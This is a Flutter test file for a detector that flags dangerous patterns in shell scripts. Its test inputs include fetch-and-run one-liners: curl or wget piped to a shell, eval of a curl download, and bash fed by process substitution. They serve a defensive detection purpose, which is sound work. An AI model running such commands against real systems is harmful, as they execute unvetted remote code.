import 'package:fav/core/utils/suspicious_script_patterns.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  group('detectSuspiciousScriptPatterns', () {
    test('returns an empty list for a benign script', () {
      const benign = '''
#!/bin/bash
set -euo pipefail
apt-get update
apt-get install -y wireguard
echo "done"
''';
      expect(detectSuspiciousScriptPatterns(benign), isEmpty);
    });

    test('flags curl piped to bash', () {
      final results = detectSuspiciousScriptPatterns(
        'curl -fsSL https://example.com/install.sh | bash',
      );
      expect(results, hasLength(1));
      expect(results.first.kind, SuspiciousPatternKind.remoteExecPipe);
      expect(results.first.line, 1);
    });

    test('flags wget piped to /bin/sh', () {
      final results = detectSuspiciousScriptPatterns(
        'wget -q -O - https://example.com/x | /bin/sh',
      );
      expect(results, hasLength(1));
      expect(results.first.kind, SuspiciousPatternKind.remoteExecPipe);
    });

    test('flags eval of a curl command substitution', () {
      final results = detectSuspiciousScriptPatterns(
        r'eval "$(curl -fsSL https://example.com/x.sh)"',
      );
      expect(results, hasLength(1));
      expect(results.first.kind, SuspiciousPatternKind.remoteExecEval);
    });

    test('flags eval of a backtick curl', () {
      final results = detectSuspiciousScriptPatterns(
        'eval `curl https://example.com`',
      );
      expect(results, hasLength(1));
      expect(results.first.kind, SuspiciousPatternKind.remoteExecEval);
    });

    test('flags process substitution feeding bash', () {
      final results = detectSuspiciousScriptPatterns(
        'bash <(curl -fsSL https://example.com/x)',
      );
      expect(results, hasLength(1));
      expect(results.first.kind, SuspiciousPatternKind.remoteExecProcSub);
    });

    test('reports one entry per matching line, with line numbers', () {
      const script = '''
#!/bin/bash
apt-get update
curl https://a.example/x | bash
echo done
wget https://b.example/y | sh
''';
      final results = detectSuspiciousScriptPatterns(script);
      expect(results.map((r) => r.line), [3, 5]);
      expect(
        results.map((r) => r.kind),
        everyElement(SuspiciousPatternKind.remoteExecPipe),
      );
    });

    test('skips commented-out matches', () {
      const script = '''
# curl https://example.com | bash   <- this is just documentation
  # wget https://example.com | sh
echo safe
''';
      expect(detectSuspiciousScriptPatterns(script), isEmpty);
    });

    test('does not flag a curl without a pipe-to-shell', () {
      const script = 'curl -o /tmp/file https://example.com/file.tar.gz';
      expect(detectSuspiciousScriptPatterns(script), isEmpty);
    });

    test('does not flag a benign eval', () {
      const script = r'eval "PATH=/usr/local/bin:$PATH"';
      expect(detectSuspiciousScriptPatterns(script), isEmpty);
    });
  });
}
